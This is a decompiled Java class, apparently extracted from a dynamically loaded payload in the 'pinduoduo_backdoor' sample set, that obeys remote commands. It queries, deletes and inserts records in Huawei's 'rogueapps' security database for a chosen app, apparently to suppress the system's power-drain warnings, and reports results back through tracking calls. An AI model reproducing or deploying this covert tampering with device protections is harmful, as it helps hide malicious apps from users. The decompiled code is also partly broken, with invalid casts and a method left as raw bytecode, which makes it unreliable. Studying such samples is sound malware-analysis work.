package com.google.android.sd.biz_dynamic_dex.hw_hide_power_window;

import android.content.ContentValues;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.hw_db_handler.HwDBHandler;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONException;
import org.json.JSONObject;

public class HidePowerWindowExecutor extends DynamicCmdExecutor {
  private static final String ACTION_QUERY = "query";
  
  private static final String ACTION_REMOVE = "remove";
  
  private static final String ACTION_UPDATE = "update";
  
  private final int CMD = 27;
  
  private AtomicBoolean inProcess = new AtomicBoolean(false);
  
  private JSONObject buildFailedCMDData(String paramString1, String paramString2, JSONObject paramJSONObject) {
    JSONObject jSONObject = new JSONObject();
    try {
      jSONObject.put(paramString1, false);
      jSONObject.put("msg", paramString2);
      jSONObject.put("operate_info", paramJSONObject);
      return jSONObject;
    } catch (Exception exception) {
      return jSONObject;
    } 
  }
  
  private ContentValues getContentValue(JSONObject paramJSONObject, String paramString) {
    ContentValues contentValues = new ContentValues();
    Iterator<String> iterator = paramJSONObject.keys();
    while (iterator.hasNext()) {
      String str = iterator.next();
      try {
        Object object = paramJSONObject.get(str);
        if (object instanceof Double || object instanceof Integer || object instanceof String || object instanceof Boolean || object instanceof Long || object instanceof Float || object instanceof Short)
          contentValues.put(str, object.toString()); 
      } catch (JSONException jSONException) {
        jSONException.printStackTrace();
      } 
    } 
    contentValues.put("pkgname", paramString);
    return contentValues;
  }
  
  private JSONObject mapToJSON(Map<String, Long> paramMap) {
    JSONObject jSONObject = new JSONObject();
    if (paramMap != null) {
      Iterator<String> iterator = paramMap.keySet().iterator();
      while (true) {
        if (iterator.hasNext()) {
          String str = iterator.next();
          try {
            jSONObject.put(str, paramMap.get(str));
          } catch (JSONException jSONException) {}
          continue;
        } 
        return jSONObject;
      } 
    } 
    return jSONObject;
  }
  
  private void trackDbOperate(Context paramContext, String paramString, int paramInt) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("status", String.valueOf(paramInt));
    hashMap.put("details", paramString);
    TrackUtils.submitTrackAsync(paramContext, 27, hashMap);
  }
  
  JSONObject query(Context paramContext, String paramString1, String paramString2) {
    JSONObject jSONObject1;
    HwDBHandler hwDBHandler = HideUtil.generateDBHandler(paramContext);
    SQLiteDatabase sQLiteDatabase = hwDBHandler.getDb();
    if (sQLiteDatabase == null) {
      hwDBHandler.clear();
      jSONObject1 = new JSONObject();
      try {
        jSONObject1.put("query_res", new JSONObject());
        jSONObject1.put("msg", "open db faield");
        return jSONObject1;
      } catch (Exception exception) {
        return jSONObject1;
      } 
    } 
    Map<String, Long> map = HideUtil.queryFromDb(sQLiteDatabase, (String)exception);
    jSONObject1.clear();
    JSONObject jSONObject2 = new JSONObject();
    try {
      jSONObject2.put("query_res", mapToJSON(map));
      jSONObject2.put("operate_info", jSONObject1.getOperateInfo());
      return jSONObject2;
    } catch (JSONException jSONException) {
      return jSONObject2;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString))
      return; 
    try {
      if (!this.inProcess.compareAndSet(false, true))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      String str2 = jSONObject.optString("pkgname", "");
      String str1 = jSONObject.optString("action");
      String str3 = jSONObject.optString("uuid");
      if (!TextUtils.isEmpty(str2)) {
        if (TextUtils.isEmpty(str1))
          return; 
        CmdData cmdData = new CmdData(27, str3, "client");
        trackDbOperate(paramContext, str1, 100);
        if ("query".equals(str1)) {
          jSONObject = query(paramContext, str2, str3);
        } else if ("remove".equals(str1)) {
          jSONObject = remove(paramContext, str2, str3);
        } else if ("update".equals(str1)) {
          jSONObject = update(paramContext, jSONObject, str2, str3);
        } else {
          jSONObject = null;
        } 
        trackDbOperate(paramContext, str1, 1);
        CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      } else {
        return;
      } 
    } finally {}
    this.inProcess.set(false);
  }
  
  JSONObject remove(Context paramContext, String paramString1, String paramString2) {
    // Byte code:
    //   0: aload_1
    //   1: invokestatic generateDBHandler : (Landroid/content/Context;)Lcom/google/android/sd/biz_dynamic_dex/hw_db_handler/HwDBHandler;
    //   4: astore_3
    //   5: aload_3
    //   6: invokevirtual getDb : ()Landroid/database/sqlite/SQLiteDatabase;
    //   9: astore #6
    //   11: aload #6
    //   13: ifnonnull -> 33
    //   16: aload_3
    //   17: invokevirtual clear : ()V
    //   20: aload_0
    //   21: ldc 'remove_res'
    //   23: ldc 'open db failed'
    //   25: aload_3
    //   26: invokevirtual getOperateInfo : ()Lorg/json/JSONObject;
    //   29: invokespecial buildFailedCMDData : (Ljava/lang/String;Ljava/lang/String;Lorg/json/JSONObject;)Lorg/json/JSONObject;
    //   32: areturn
    //   33: iconst_1
    //   34: istore #4
    //   36: aload #6
    //   38: ldc 'rogueapps'
    //   40: ldc 'pkgname = ?'
    //   42: iconst_1
    //   43: anewarray java/lang/String
    //   46: dup
    //   47: iconst_0
    //   48: aload_2
    //   49: aastore
    //   50: invokevirtual delete : (Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I
    //   53: ifeq -> 71
    //   56: aload_3
    //   57: aload_1
    //   58: invokevirtual write : (Landroid/content/Context;)Z
    //   61: istore #5
    //   63: iload #5
    //   65: ifeq -> 71
    //   68: goto -> 74
    //   71: iconst_0
    //   72: istore #4
    //   74: aload_3
    //   75: invokevirtual clear : ()V
    //   78: new org/json/JSONObject
    //   81: dup
    //   82: invokespecial <init> : ()V
    //   85: astore_1
    //   86: aload_1
    //   87: ldc 'remove_res'
    //   89: iload #4
    //   91: invokevirtual put : (Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   94: pop
    //   95: aload_1
    //   96: ldc 'operate_info'
    //   98: aload_3
    //   99: invokevirtual getOperateInfo : ()Lorg/json/JSONObject;
    //   102: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   105: pop
    //   106: aload_1
    //   107: areturn
    //   108: astore_1
    //   109: aload_3
    //   110: invokevirtual clear : ()V
    //   113: new java/lang/StringBuilder
    //   116: dup
    //   117: invokespecial <init> : ()V
    //   120: astore_2
    //   121: aload_2
    //   122: ldc_w 'remove failed: '
    //   125: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   128: pop
    //   129: aload_2
    //   130: aload_1
    //   131: invokevirtual getMessage : ()Ljava/lang/String;
    //   134: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   137: pop
    //   138: aload_0
    //   139: ldc 'remove_res'
    //   141: aload_2
    //   142: invokevirtual toString : ()Ljava/lang/String;
    //   145: aload_3
    //   146: invokevirtual getOperateInfo : ()Lorg/json/JSONObject;
    //   149: invokespecial buildFailedCMDData : (Ljava/lang/String;Ljava/lang/String;Lorg/json/JSONObject;)Lorg/json/JSONObject;
    //   152: areturn
    //   153: astore_2
    //   154: aload_1
    //   155: areturn
    // Exception table:
    //   from	to	target	type
    //   36	63	108	java/lang/Exception
    //   86	106	153	java/lang/Exception
  }
  
  JSONObject update(Context paramContext, JSONObject paramJSONObject, String paramString1, String paramString2) {
    boolean bool;
    paramJSONObject = paramJSONObject.optJSONObject("value");
    if (paramJSONObject == null || TextUtils.isEmpty(paramString1))
      return buildFailedCMDData("update_res", "invalid input", null); 
    ContentValues contentValues = getContentValue(paramJSONObject, paramString1);
    HwDBHandler hwDBHandler = HideUtil.generateDBHandler(paramContext);
    SQLiteDatabase sQLiteDatabase = hwDBHandler.getDb();
    if (sQLiteDatabase == null) {
      hwDBHandler.clear();
      return buildFailedCMDData("update_res", "open db failed", hwDBHandler.getOperateInfo());
    } 
    if (HideUtil.insertNewRecord(sQLiteDatabase, contentValues, paramString1) && hwDBHandler.write(paramContext)) {
      bool = true;
    } else {
      bool = false;
    } 
    hwDBHandler.clear();
    JSONObject jSONObject = new JSONObject();
    try {
      jSONObject.put("update_res", bool);
      jSONObject.put("operate_info", hwDBHandler.getOperateInfo());
      return jSONObject;
    } catch (Exception exception) {
      return jSONObject;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7c6e6702-e461-4315-8631-eee246aeba95-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_hide_power_window\HidePowerWindowExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */